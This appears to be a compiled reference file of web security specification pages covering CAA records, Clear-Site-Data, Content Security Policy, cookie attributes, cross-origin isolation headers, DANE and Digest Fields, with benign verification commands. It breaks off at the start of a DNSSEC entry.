# Security — deep reference (verbatim spec pages)

Verbatim content of The Website Specification pages for this category, fetched 2026-10-17 (content CC BY 4.0 / code MIT). Canonical base: https://specification.website/spec/security/. Assembled from the local evidence corpus (.zflow/evidence/specweb/security/). Live truth and deltas: the specification-website skill (MCP get_changes). Loaded on demand when a checklist check fails or the full rule text, examples, or cited standards are needed.

## caa-records
Source: https://specification.website/spec/security/caa-records/

---
title: "DNS CAA records"
category: security
status: recommended
url: https://specification.website/spec/security/caa-records/
updated: "2026-05-29T09:13:20.000Z"
sources:
  - title: "RFC 8659 — DNS Certification Authority Authorization (CAA) Resource Record"
    url: "https://www.rfc-editor.org/rfc/rfc8659"
    publisher: "IETF"
  - title: "Let's Encrypt — CAA"
    url: "https://letsencrypt.org/docs/caa/"
    publisher: "Let's Encrypt"
  - title: "RFC 8657 — CAA Record Extensions for Account URI and ACME Method Binding"
    url: "https://www.rfc-editor.org/rfc/rfc8657"
    publisher: "IETF"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# DNS CAA records

> A CAA record tells certificate authorities which of them are allowed to issue certificates for your domain. Cheap to add, blocks a class of mis-issuance attacks.

## What it is

A Certification Authority Authorization record is a DNS record that names the certificate authorities allowed to issue TLS certificates for your domain. Specified in RFC 8659, CAA records are mandatory for CAs to check before issuing a publicly trusted certificate. Any CA that finds a CAA record listing a different issuer must refuse the request.

```
example.com.    300    IN    CAA    0 issue "letsencrypt.org"
example.com.    300    IN    CAA    0 issuewild "letsencrypt.org"
example.com.    300    IN    CAA    0 iodef "mailto:security@example.com"
```

## Why it matters

There are around 50 publicly trusted certificate authorities. Without a CAA record, any of them can issue a certificate for your domain — and historically several have, by mistake or after social engineering. A CAA record narrows that list to the CAs you actually use. If an attacker tricks a different CA into issuing a certificate, that CA's automated checks refuse the request before the certificate is signed.

CAA records do not encrypt or sign anything themselves. They are simply a published policy that compliant CAs must honour.

## How to implement

Add CAA records at the apex of your domain. They cover all subdomains unless overridden.

Common tags:

- **`issue`** — names a CA permitted to issue any certificate. A bare hostname like `letsencrypt.org` is the standard form. `";"` (a single semicolon) explicitly forbids all issuance.
- **`issuewild`** — names a CA permitted to issue wildcard certificates. Set this only if you need wildcards.
- **`iodef`** — an email or URL where CAs report failed checks (Incident Object Description Exchange Format).

Recommended starter set for a site using Let's Encrypt:

```
example.com.    300    IN    CAA    0 issue "letsencrypt.org"
example.com.    300    IN    CAA    0 issuewild ";"
example.com.    300    IN    CAA    0 iodef "mailto:security@example.com"
```

To allow a second CA (for redundancy or a different product):

```
example.com.    300    IN    CAA    0 issue "letsencrypt.org"
example.com.    300    IN    CAA    0 issue "sectigo.com"
```

Some CAs support extra parameters that pin the policy to a specific account or validation method. Let's Encrypt documents the `accounturi` and `validationmethods` extensions, which let you lock issuance to a specific ACME account.

Pair CAA with [DNSSEC](/spec/security/dnssec/) where possible. CAA without DNSSEC still helps — CAs check it — but DNSSEC stops an attacker from spoofing the DNS response.

## Common mistakes

- **No CAA record at all.** Every public CA may issue. Set at least one record.
- **Forgetting `issuewild`.** Without it, issuance of wildcards inherits the `issue` tag, which may be more permissive than you intend.
- **Listing a CA you no longer use.** Audit the records when you change provider.
- **Setting CAA on a subdomain you do not control issuance for.** Records at the apex are usually enough; only override per-subdomain when needed.

## Verification

- `dig CAA example.com +short` lists the records.
- Use the [SSLMate CAA Test](https://sslmate.com/caa/) or `curl -s "https://crt.sh/?q=example.com"` to confirm only expected CAs have issued certificates.
- Try to issue a test certificate from a CA not on the list; the issuance should fail with a CAA error.
- Monitor `iodef` mail for unexpected attempts.
---

## clear-site-data
Source: https://specification.website/spec/security/clear-site-data/

---
title: "Clear-Site-Data"
category: security
status: optional
url: https://specification.website/spec/security/clear-site-data/
updated: "2026-06-22T00:00:00.000Z"
sources:
  - title: "Clear Site Data (W3C Working Draft)"
    url: "https://www.w3.org/TR/clear-site-data/"
    publisher: "W3C"
  - title: "MDN — Clear-Site-Data"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Clear-Site-Data"
    publisher: "MDN"
  - title: "OWASP Secure Headers Project — Clear-Site-Data"
    url: "https://owasp.org/www-project-secure-headers/"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Clear-Site-Data

> Clear-Site-Data lets a response tell the browser to wipe cookies, storage, and caches for your origin. Send it on logout so a shared device keeps nothing behind.

## What it is

`Clear-Site-Data` is a response header that tells the browser to throw away data it holds for your origin — cookies, DOM storage, caches, and more. Each value is a quoted token, and you can send several at once.

```http
Clear-Site-Data: "cache", "cookies", "storage"
```

The header is defined by the W3C Clear Site Data specification and has been Baseline widely available across browsers since September 2023. It only works in a secure context (HTTPS).

The directives:

- **`"cookies"`** — removes all cookies and HTTP auth credentials for the registered domain, including subdomains.
- **`"storage"`** — clears `localStorage`, `sessionStorage`, IndexedDB, and unregisters service workers.
- **`"cache"`** — clears the HTTP cache, and often the back/forward cache and prerendered pages.
- **`"clientHints"`** — drops stored client hints (also cleared by `cookies`, `cache`, or `*`).
- **`"prefetchCache"` / `"prerenderCache"`** — discard speculation-rules prefetches and prerenders.
- **`"executionContexts"`** — reloads open browsing contexts for the origin.
- **`"*"`** — everything, including data types added in future revisions.

## Why it matters

When a user signs out, the session is over on the server — but the browser still holds their cookies, cached pages, and whatever you wrote to storage. On a shared or public machine, the next person can hit the back button onto a cached account page, or a stale token can linger. `Clear-Site-Data` closes that gap in a single header, without you having to enumerate and expire each cookie and storage key by hand.

It is also the cleanest way to recover from a compromised or rotated credential: serve the header once and the client state is reset.

## How to implement

Send the header on the response that confirms the sign-out — the `/logout` redirect or its landing page — listing the data types you actually want gone:

```http
Clear-Site-Data: "cache", "cookies", "storage", "executionContexts"
```

Scope it to the exact responses that should clear data. Never send it site-wide: a stray `Clear-Site-Data` on every response wipes the user's session on each request.

## Common mistakes

- **Omitting the quotes.** `Clear-Site-Data: cookies` is invalid; the value must be `"cookies"`.
- **Sending it over plain HTTP.** It is ignored outside a secure context.
- **Expecting cross-origin reach.** It only clears data for the origin of the response, not third parties.
- **`"cookies"` surprises.** It clears the whole registered domain, including every subdomain — intended, but easy to forget.

## Verification

- `curl -sI https://example.com/logout | grep -i clear-site-data` should show the header on the sign-out response only.
- Sign in, sign out, then check DevTools → Application: cookies and storage for the origin should be empty.
---

## content-security-policy
Source: https://specification.website/spec/security/content-security-policy/

---
title: "Content Security Policy (CSP)"
category: security
status: recommended
url: https://specification.website/spec/security/content-security-policy/
updated: "2026-07-09T00:00:00.000Z"
sources:
  - title: "Content Security Policy Level 3"
    url: "https://www.w3.org/TR/CSP3/"
    publisher: "W3C"
  - title: "MDN — Content-Security-Policy"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy"
    publisher: "MDN"
  - title: "OWASP — Content Security Policy Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
    publisher: "OWASP"
  - title: "Google — Strict CSP"
    url: "https://web.dev/articles/strict-csp"
    publisher: "web.dev"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Content Security Policy (CSP)

> A CSP tells browsers which sources of script, style, image, and frame content to trust. A good policy stops most XSS and data-exfiltration attacks dead.

## What it is

Content Security Policy is a response header that restricts which resources a page may load and execute. Level 3 is the current specification. The browser enforces the policy; any script, style, image, frame, or fetch from a source the policy does not allow is blocked, and a report is sent if a reporting endpoint is configured.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; report-to csp-endpoint
```

## Why it matters

The single biggest class of web vulnerabilities is cross-site scripting. A solid CSP turns a successful XSS injection from "attacker runs JavaScript in your origin" into "browser blocks the script and logs a violation". CSP also limits where data can be exfiltrated to, prevents your site from being framed, and disables dangerous legacy features like inline event handlers.

## How to implement

Build a strict, nonce-based policy. The recommended pattern from Google's strict CSP guidance:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  report-to csp-endpoint
```

That `script-src` looks self-contradicting: it lists `'unsafe-inline'` and `https:`, the very things the mistakes below tell you to drop. The contradiction is deliberate and safe. Once `'strict-dynamic'` and a nonce are present, a modern browser ignores both. The CSP Level 3 rule is that `'strict-dynamic'` discards every host allowlist and `'unsafe-inline'`, leaving the nonce as the only thing that decides what runs. The `https:` and `'unsafe-inline'` are there purely as a fallback for older browsers that predate nonces, giving them a weak policy rather than none. The nonce carries the real policy; the leftovers are for readers that cannot understand it. What you must never do is ship `'unsafe-inline'` _without_ a nonce and `'strict-dynamic'`: on its own it is not a fallback, it is the whole policy, and it permits exactly the injected inline script CSP exists to block.

Key directives:

- **`default-src 'self'`** — fallback for all fetch directives. Allow your own origin by default.
- **`script-src`** — controls JavaScript. Use a per-response nonce; the `strict-dynamic` keyword lets a trusted script load further trusted scripts.
- **`style-src`** — controls CSS. Same nonce model where possible.
- **`img-src`, `font-src`, `connect-src`, `media-src`** — list the third parties you actually use.
- **`frame-ancestors 'none'`** — replaces `X-Frame-Options`. See [Clickjacking protection](/spec/security/frame-ancestors/).
- **`object-src 'none'`** — kills Flash and plugin embeds.
- **`base-uri 'none'`** — blocks `<base>` tag injection attacks.
- **`report-to`** — endpoint that receives violation reports as JSON.

Generate a fresh nonce per response and embed it in every inline `<script>` tag.

## Common mistakes

- **`unsafe-inline` or `unsafe-eval` standing alone.** As above, `'unsafe-inline'` only degrades safely with a nonce and `'strict-dynamic'` beside it; by itself it neutralises the protection, and `'unsafe-eval'` re-enables `eval()`. Use nonces or hashes.
- **Wildcards like `script-src *` or `https:` alone.** Almost as bad as no policy at all.
- **No `frame-ancestors`.** Leaves clickjacking open.
- **Forgetting the nonce on server-rendered inline scripts.** The browser will block them and the page breaks.
- **Shipping a report-only policy forever.** Use `Content-Security-Policy-Report-Only` to test, then switch to enforcing.

## Verification

- `curl -sI https://example.com | grep -i content-security-policy` should return the header.
- Run the page through [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/).
- Open DevTools → Console. CSP violations appear as `Refused to load …` errors.
- Wire up a reporting endpoint and watch for unexpected blocks before tightening.
---

## cookie-attributes
Source: https://specification.website/spec/security/cookie-attributes/

---
title: "Cookie attributes — Secure, HttpOnly, SameSite"
category: security
status: required
url: https://specification.website/spec/security/cookie-attributes/
updated: "2026-07-09T00:00:00.000Z"
sources:
  - title: "draft-ietf-httpbis-rfc6265bis — Cookies: HTTP State Management Mechanism"
    url: "https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis"
    publisher: "IETF"
  - title: "MDN — Set-Cookie"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie"
    publisher: "MDN"
  - title: "OWASP — Session Management Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
    publisher: "OWASP"
  - title: "web.dev — SameSite cookies explained"
    url: "https://web.dev/articles/samesite-cookies-explained"
    publisher: "web.dev"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Cookie attributes — Secure, HttpOnly, SameSite

> Every cookie should be Secure, HttpOnly where possible, and have an explicit SameSite. Use __Host- and __Secure- prefixes for session cookies.

## What it is

Cookies carry session state, authentication, and preferences. The `Set-Cookie` response header has a handful of attributes that decide how much the cookie can be abused if something goes wrong. Setting them correctly is one of the cheapest, highest-impact security wins on any site.

```http
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

The attributes below are specified in RFC 6265bis (the in-progress update to RFC 6265).

## Why it matters

A cookie without `Secure` can leak over plain HTTP. A cookie without `HttpOnly` can be read by any JavaScript that runs in the page — including XSS payloads. A cookie without `SameSite` is attached to cross-site requests, which is exactly what CSRF needs. Modern browsers default `SameSite` to `Lax` when not set, but relying on the default leaves older clients and edge cases unprotected.

## How to implement

Set these attributes on every cookie unless you have a specific reason not to.

- **`Secure`** — sent only over HTTPS. Mandatory on any cookie that carries identity. Required for `SameSite=None`.
- **`HttpOnly`** — not exposed to `document.cookie`. Use on every session cookie. Skip it on cookies your JavaScript genuinely needs to read (preferences, A/B test bucket).
- **`SameSite=Lax`** — sent on top-level navigations to your site but not on cross-site iframes, images, or `fetch`. Sensible default for session cookies.
- **`SameSite=Strict`** — sent only on requests originating from your own site. Strongest CSRF defence; breaks the common pattern of arriving via an external link while already logged in.
- **`SameSite=None; Secure`** — required for cross-site cookies (third-party widgets, SSO, embedded checkouts). Use sparingly.

### Cookie prefixes

Two browser-enforced prefixes raise the bar further:

- **`__Secure-`** — the cookie name must start with `__Secure-`, and the browser only accepts the cookie if it has the `Secure` attribute.
- **`__Host-`** — name starts with `__Host-`, the cookie must be `Secure`, must have `Path=/`, and must not have a `Domain` attribute. Pins the cookie to the exact host.

Use `__Host-` for session cookies whenever you can. It blocks subdomain takeover from rewriting the session cookie.

```http
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: __Secure-prefs=dark; Path=/; Secure; SameSite=Lax; Max-Age=31536000
```

Always set an explicit `Path`, `Max-Age` or `Expires`, and a sensible value length. Avoid `Domain=example.com` unless you really need the cookie on subdomains.

## Common mistakes

- **No `Secure`.** A single HTTP request leaks the cookie.
- **No `HttpOnly` on session cookies.** Any XSS becomes an account takeover.
- **`SameSite=None` without `Secure`.** Modern browsers reject the cookie outright.
- **Putting `__Host-` on a cookie with `Domain` set.** Browser ignores it.
- **Sharing one cookie across many subdomains by default.** Set `Domain` only when you actually need it.
- **Treating `SameSite` as a complete CSRF defence.** It is defence in depth, not a replacement for anti-CSRF tokens. `SameSite=Lax` still sends the cookie on top-level GET navigations, so a state-changing request reachable by `GET` and triggered from another site keeps the session attached; and `SameSite` keys on the registered domain, not the origin, so it trusts every subdomain. Pair it with per-request CSRF tokens or a `Sec-Fetch-Site` check for state-changing endpoints.

## Verification

- DevTools → Application → Cookies. Each row shows the attributes. Confirm `Secure`, `HttpOnly`, and `SameSite` on every session cookie.
- `curl -sI https://example.com | grep -i set-cookie`.
- Try setting `__Host-foo=1; Path=/` from a page without `Secure` — the browser should refuse.
- Audit cookies served by third parties; their defaults are not your defaults.
---

## cross-origin-isolation
Source: https://specification.website/spec/security/cross-origin-isolation/

---
title: "Cross-origin isolation (COOP / COEP / CORP)"
category: security
status: recommended
url: https://specification.website/spec/security/cross-origin-isolation/
updated: "2026-06-11T00:00:00.000Z"
sources:
  - title: "HTML Standard — Cross-Origin-Opener-Policy"
    url: "https://html.spec.whatwg.org/multipage/browsers.html#the-coop-headers"
    publisher: "WHATWG"
  - title: "Fetch Standard — Cross-Origin-Resource-Policy header"
    url: "https://fetch.spec.whatwg.org/#cross-origin-resource-policy-header"
    publisher: "WHATWG"
  - title: "MDN — Cross-Origin-Opener-Policy"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy"
    publisher: "MDN"
  - title: "MDN — Cross-Origin-Resource-Policy"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Resource-Policy"
    publisher: "MDN"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Cross-origin isolation (COOP / COEP / CORP)

> Three response headers — Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy, and Cross-Origin-Resource-Policy — that sever risky cross-window and cross-origin links and defend against side-channel leaks.

## What it is

Three response headers that control how your documents and resources relate to other origins:

- **`Cross-Origin-Opener-Policy` (COOP)** severs the `window.opener` link between your page and the page that opened it, placing your document in its own browsing context group. Values: `unsafe-none` (default), `same-origin-allow-popups`, `same-origin`, and the newer `noopener-allow-popups`.
- **`Cross-Origin-Resource-Policy` (CORP)** tells the browser which origins may embed a resource — your images, scripts, fonts — as a `no-cors` subresource. Values: `same-origin`, `same-site`, `cross-origin`.
- **`Cross-Origin-Embedder-Policy` (COEP)** requires every subresource your document loads to opt in via CORP or CORS. Values: `unsafe-none`, `require-corp`, `credentialless`.

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
```

## Why it matters

When a user follows a link off your site — or arrives on your site from someone else's link — the two pages can keep a live connection through the `window.opener` handle. A malicious page can abuse that connection: the moment the user's attention is elsewhere, it can silently swap the tab it opened to a pixel-perfect fake of your login screen (a "tabnabbing" attack), or quietly probe which sites the user is signed in to. The user notices nothing and types their password into the impostor. COOP cuts that connection, so a page on another origin can no longer reach back into yours.

CORP guards your resources from the opposite direction, and the threat it answers needs a word of background. **Spectre** is a family of processor flaws, disclosed in 2018, that let code read areas of memory it should never be allowed to see — including data belonging to _other_ websites that happen to be running in the same browser process. A page could exploit it to read your signed-in user's private data — their email, their account balance — without ever making a normal request for it. The browser's defence is to keep each origin's data out of processes that have no business touching it; CORP is how a resource declares "only my own site may embed me," so it is never pulled into an attacker's process in the first place. ([web.dev — Why you need cross-origin isolation](https://web.dev/articles/why-coop-coep) explains the attack and the fix in depth.)

The practical payoff is high and the cost is near zero: setting COOP and CORP closes off a whole category of invisible cross-site snooping — no consent prompt, no broken functionality, no measurable performance hit. The user is simply safer and never has to know the headers exist.

Setting COOP `same-origin` together with COEP additionally unlocks **cross-origin isolation** (`crossOriginIsolated === true`) — the browser's confirmation that your page is fully walled off from other origins. Only once that holds will the browser hand your page the powerful, isolation-gated APIs such as `SharedArrayBuffer` and unthrottled high-resolution timers.

This site ships `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-site` on every response — see [`public/_headers`](https://github.com/jdevalk/specification.website/blob/main/public/_headers).

## How to implement

Send COOP and CORP on every HTML response as a baseline:

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
```

If your site relies on OAuth or payment pop-ups, relax COOP to `same-origin-allow-popups` so the pop-up flow keeps working while isolated pages stay protected.

Only add `Cross-Origin-Embedder-Policy: require-corp` if you actually need `SharedArrayBuffer` or other isolation-gated APIs — it forces every cross-origin subresource to opt in, which often breaks third-party embeds until each one sends CORP or CORS. Treat full isolation as opt-in, not a default.

## Common mistakes

- **Reaching for `require-corp` without needing isolation.** It breaks embeds for no benefit unless an isolation-gated API is in use.
- **`same-origin` COOP on pages that depend on pop-up callbacks.** Use `same-origin-allow-popups` there.
- **Serving CORP `same-origin` on assets meant to be hot-linked** (a public CDN, embeddable widget). Use `cross-origin` for genuinely public resources.
- **Setting the headers on HTML but not on the resources** other sites legitimately embed.

## Verification

- `curl -sI https://example.com | grep -iE 'cross-origin-(opener|resource|embedder)-policy'`.
- In DevTools, read `self.crossOriginIsolated` — `true` confirms COOP `same-origin` + COEP `require-corp` are both in force.
- Check the **Application → Frames** panel for COOP/COEP status reported per document.
---

## dane
Source: https://specification.website/spec/security/dane/

---
title: "DANE for HTTPS"
category: security
status: optional
url: https://specification.website/spec/security/dane/
updated: "2026-10-15T00:00:00.000Z"
sources:
  - title: "RFC 6698 — The DNS-Based Authentication of Named Entities (DANE) Transport Layer Security (TLS) Protocol: TLSA"
    url: "https://www.rfc-editor.org/rfc/rfc6698"
    publisher: "IETF"
  - title: "RFC 7671 — The DNS-Based Authentication of Named Entities (DANE) Protocol: Updates and Operational Guidance"
    url: "https://www.rfc-editor.org/rfc/rfc7671"
    publisher: "IETF"
  - title: "RFC 7672 — SMTP Security via Opportunistic DNS-Based Authentication of Named Entities (DANE) Transport Layer Security (TLS)"
    url: "https://www.rfc-editor.org/rfc/rfc7672"
    publisher: "IETF"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# DANE for HTTPS

> A TLSA record at _443._tcp pins your HTTPS certificate or key in DNSSEC-signed DNS. No mainstream browser checks it, so for websites it is optional; its real home is SMTP.

## What it is

DANE (DNS-Based Authentication of Named Entities, RFC 6698) lets a domain publish, in DNS, which certificate or public key a TLS service should present. The record type is `TLSA`, and it lives at a name built from the port, the transport and the host. For HTTPS on `www.example.com` that is `_443._tcp.www.example.com`:

```
_443._tcp.www.example.com.  3600  IN  TLSA  3 1 1 8f1a...c94e
```

The three numbers say what is being matched. `3 1 1` (DANE-EE, public key, SHA-256) is the usual choice: "the server's own public key hashes to this value", independent of which certificate authority signed it. `2 1 1` (DANE-TA) pins a trust anchor, such as your CA's intermediate, instead.

DANE only means anything on top of [DNSSEC](/spec/security/dnssec/). Without signatures, anyone who can forge a DNS answer can forge the `TLSA` record too, so clients ignore `TLSA` records from unsigned zones.

## Why it matters

For websites, honestly, not much yet. **No mainstream browser validates DANE.** Chrome, Firefox, Safari and Edge all ignore `TLSA` records and trust the certificate authority system alone. Chrome briefly experimented with DNSSEC-authenticated certificates and dropped the idea, citing the latency of extra DNSSEC lookups and the share of networks that break them; no other browser shipped it. Publishing a `TLSA` record for port 443 therefore changes nothing for a visitor today. That is why this page is `optional`, and why tests that score it (Internet.nl does) are measuring readiness rather than a protection any visitor receives.

Where DANE does real work is mail. Mail servers deliver to each other over opportunistic STARTTLS, which an attacker can strip or redirect, and there is no browser-style certificate check to fall back on. DANE for SMTP (RFC 7672) lets a receiving domain tell sending servers "always use TLS, and expect this key", and major mail providers do check it. If you run mail on your domain, that is the place to spend DNSSEC and DANE effort first: see [DANE for SMTP on specification.email](https://specification.email/spec/authentication/dane-for-smtp/).

## How to implement

If you publish a `TLSA` record for HTTPS anyway, for consistency with a mail setup or for clients that do validate:

1. **Sign the zone with DNSSEC** and confirm the chain validates. Without this, stop.
2. **Choose the usage.** `3 1 1` pins your server's public key; it survives certificate renewals as long as the key does not change. `2 1 1` pins the CA's intermediate key and survives renewals with that CA.
3. **Generate the record** from the certificate the server actually serves, with a tool such as `ldns-dane` or `hash-slinger`, or by hashing the SubjectPublicKeyInfo with SHA-256.
4. **Roll keys in two steps** (RFC 7671). Publish the `TLSA` record for the new key alongside the old one, wait at least the record's TTL, then switch the server to the new key, then remove the old record. ACME clients that generate a new key at every renewal break `3 1 1` records unless configured to reuse the key or to publish the new record first.

This site does not ship it for HTTPS: the zone is DNSSEC-signed, but no browser would act on a `_443._tcp` record. For SMTP the `TLSA` records belong to the MX hosts, which here are run by the mail provider, so publishing them is the provider's job.

## Common mistakes

- **A `TLSA` record in an unsigned zone.** Validating clients ignore it; it is decoration.
- **Automated certificate renewal with a fresh key each time** and a `3 1 1` record that never changes. The record stops matching on the next renewal. For mail, where senders do check, that is a delivery outage.
- **Expecting browser protection.** A `TLSA` record does not stop a mis-issued certificate from being accepted by a browser. [CAA records](/spec/security/caa-records/) and Certificate Transparency monitoring are what limit mis-issuance on the web.
- **Publishing `TLSA` for the wrong name.** It belongs at `_443._tcp.` plus the exact host name clients connect to, for each host name.

## Verification

- `dig +dnssec TLSA _443._tcp.www.example.com` returns the record and the `ad` flag from a validating resolver.
- `openssl s_client -connect www.example.com:443 -dane_tlsa_domain www.example.com -dane_tlsa_rrdata "3 1 1 <hash>"` reports a verified DANE match.
- The [Internet.nl website test](https://internet.nl/) includes DANE in its HTTPS section: it checks that a `TLSA` record exists, is DNSSEC-signed, and matches the served certificate.
---

## digest-fields
Source: https://specification.website/spec/security/digest-fields/

---
title: "Digest Fields (Content-Digest, Repr-Digest and Unencoded-Digest)"
category: security
status: optional
url: https://specification.website/spec/security/digest-fields/
updated: "2026-09-10T00:00:00.000Z"
sources:
  - title: "RFC 9530 — Digest Fields"
    url: "https://www.rfc-editor.org/rfc/rfc9530.html"
    publisher: "IETF"
  - title: "HTTP Unencoded Digest — IETF working-group draft"
    url: "https://datatracker.ietf.org/doc/draft-ietf-httpbis-unencoded-digest/"
    publisher: "IETF"
  - title: "MDN browser compatibility data — Unencoded-Digest"
    url: "https://github.com/mdn/browser-compat-data/blob/main/http/headers/Unencoded-Digest.json"
    publisher: "MDN"
  - title: "Signature-based Integrity — Unencoded-Digest validation"
    url: "https://wicg.github.io/signature-based-sri/#unencoded-digest-validation"
    publisher: "W3C Web Incubator Community Group"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# Digest Fields (Content-Digest, Repr-Digest and Unencoded-Digest)

> Digest Fields let clients check received bytes. Unencoded-Digest works after decompression, with limited browser support.

## What it is

RFC 9530 defines `Content-Digest` and `Repr-Digest`, HTTP request and response fields carrying cryptographic hashes so the recipient can check the bytes arrived intact. The newer `Unencoded-Digest` complements them when content compression is involved.

```
Content-Digest: sha-256=:MaQTBTcydo27elAT7IySnGWPjltWKdB+8bxmm3LlAk0=:
```

The RFC 9530 fields are [Structured Fields](https://www.rfc-editor.org/rfc/rfc8941.html) Dictionaries: the key names the algorithm, the value is a Byte Sequence, and the wrapping colons are what mark it as one. Listing several algorithms in one field is legal, and is how you migrate between them without breaking older clients.

They differ in coverage. `Content-Digest` hashes the message content actually transferred. `Repr-Digest` hashes the entire selected representation, whether or not all of it was sent. On an ordinary full response they are identical. They diverge on a range request: for `Range: bytes=10-18` against `{"hello": "world"}`, `Repr-Digest` still covers the whole object while `Content-Digest` covers only the nine bytes returned.

Two request fields, `Want-Content-Digest` and `Want-Repr-Digest`, let a client ask for a digest and rank algorithms by an integer preference from 0 to 10, where 0 means "not acceptable".

RFC 9530 obsoletes RFC 3230's `Digest` field, which failed to interoperate precisely because it never settled whether the hash covered the bytes on the wire or the resource behind them.

## Why it matters

TLS already stops a network attacker, and the RFC is blunt that digests add nothing there: an on-path actor can strip the field or recompute it over altered content.

The value is in catching accidents. A transforming proxy that recompressed a payload, a truncated upload, a storage backend that silently returned the wrong object. For any client that caches or redistributes what it fetched, a digest is the difference between trusting a pipeline and verifying it.

Digests also compose with signatures. [HTTP Message Signatures](https://www.rfc-editor.org/rfc/rfc9421.html) cover header fields, not bodies; signing `Content-Digest` is how that coverage is extended to the content. Only then does a digest resist a deliberate attacker, because the signature makes stripping it detectable.

## How to implement

Hash the body and emit the field. Use `sha-256` or `sha-512`, the only algorithms the [IANA registry](https://www.iana.org/assignments/http-digest-hash-alg/http-digest-hash-alg.xhtml) marks `Active`. Everything else there, including `md5`, `sha` (SHA-1), `crc32c` and `adler`, is registered `Deprecated`.

Emit `Repr-Digest` when you can hash the whole resource and `Content-Digest` when you can only hash what you sent. On a plain `200` with no compression, one value satisfies both.

If you honour `Want-Content-Digest`, the algorithm depends on a request header, so add that field to `Vary` or caches will serve one client's SHA-512 to a client that asked for SHA-256.

Spend the effort where a client will act on it: JSON APIs, file downloads, and machine-readable endpoints that agents fetch and cache. Browsers do not automatically validate `Content-Digest` or `Repr-Digest`; `Unencoded-Digest` has separate, limited browser support.

This site emits `Content-Digest` and `Repr-Digest` on every Markdown representation, covering the per-page [`.md` endpoints](/spec/agent-readiness/markdown-source-endpoints/), `/llms.txt` and `/checklist.md`, and honours `Want-Content-Digest`.

### Unencoded-Digest: checking after decompression

`Unencoded-Digest` hashes the **entire selected representation with no content coding applied**. The same value can survive gzip or Brotli recompression when decoding restores exactly the same bytes. It does not cover just one range: a client must reconstruct the complete representation before checking it.

Use it when the receiving client checks decoded bytes, such as after transparent decompression. Hash the original bytes with `sha-256` or `sha-512` and use the same Structured Fields dictionary syntax. It complements the encoded-byte checks above; it does not authenticate the sender.

As checked on 10 September 2026, MDN records support in **Chrome and Edge from version 141**, with Firefox and Safari unsupported. The [signature-based integrity specification](https://wicg.github.io/signature-based-sri/#unencoded-digest-validation) defines validation against the decoded response body. Test your target browser and resource type: emitting a header does not make every client enforce it. The HTTP field definition is still an Internet-Draft, currently in the RFC Editor queue.

`Want-Unencoded-Digest` expresses algorithm preferences using integers from 0 to 10, just like the other preference fields. It is a hint, not a guarantee of a digest response; browser support for `Unencoded-Digest` does not establish support for this companion field.

This site does not emit `Unencoded-Digest`: its current digest service targets uncompressed Markdown, where the existing fields already cover the same bytes.

## Common mistakes

- **Hashing before downstream compression for `Content-Digest` or `Repr-Digest`.** These two fields are tied to `Content-Encoding`. A CDN that gzips a response _after_ your application computed the hash leaves you advertising a digest of bytes the client never receives, and every conformant validation fails. Hash what goes on the wire, or omit the field on responses your edge may recompress. That is why the digests here stop at Markdown: our HTML is brotli-compressed downstream of the middleware that would compute them.
- **Assuming `Repr-Digest` is encoding-independent.** It is independent of _transfer_ codings such as HTTP/1.1 chunking, which is a different thing. The same resource has one `Repr-Digest` served identity and another served brotli.
- **Treating a digest as authentication.** It proves nothing about origin.
- **Reaching for MD5 out of habit.** It is `Deprecated` and collision-vulnerable.

## Verification

Recompute the hash independently. The digest is base64 of the raw hash, not of its hex form:

```
curl -sS -D headers.txt -o body https://example.com/data.json
grep -i '^content-digest' headers.txt
echo "sha-256=:$(openssl dgst -sha256 -binary body | openssl base64 -A):"
```

The two lines must match byte for byte, colons and all. Repeat with `Accept-Encoding: gzip` and with `identity`, and confirm the advertised digest still describes what you received. That is where a misconfigured proxy shows itself.

For `Unencoded-Digest`, hash the decoded body instead. Request a complete response with `curl --compressed -D headers.txt -o body https://example.com/data.json`, then compare its hash with `Unencoded-Digest`. Repeat with identity encoding: if the decoded bytes are identical, the digest should match across both responses. In a controlled browser test, serve a correct digest and then a deliberately incorrect one; confirm that the supporting browser rejects the mismatch for your intended resource type.
---

## dnssec
Source: https://specification.website/spec/security/dnssec/

---
title: "DNSSEC"
category: security
status: optional
url: https://specification.website/spec/security/dnssec/
updated: "2026-08-08T00:00:00.000Z"
sources:
  - title: "RFC 4033 — DNS Security Introduction and Requirements"
    url: "https://www.rfc-editor.org/rfc/rfc4033"
    publisher: "IETF"
  - title: "RFC 4035 — Protocol Modifications for the DNS Security Extensions"
